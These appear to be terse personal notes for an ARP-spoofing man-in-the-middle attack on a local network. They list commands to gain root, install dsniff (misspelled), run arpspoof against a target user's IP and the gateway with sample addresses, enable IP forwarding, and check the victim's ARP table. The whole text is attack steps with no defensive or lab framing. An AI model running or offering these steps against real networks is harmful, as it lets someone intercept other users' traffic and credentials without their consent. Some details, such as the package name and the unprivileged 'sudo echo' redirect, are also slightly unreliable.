sudo su => make as root
sudo apt-get install dsnif
sudo arpspoof -i [inteface name - wlan0] [targeted user ip ] [targeted server ip]
    sudo arpspoof -i wlan0 192.168.1.110 192.168.1.1

sudo echo 1 > /proc/sys/net/ipv4/ip_forward

user's terminal => arp -a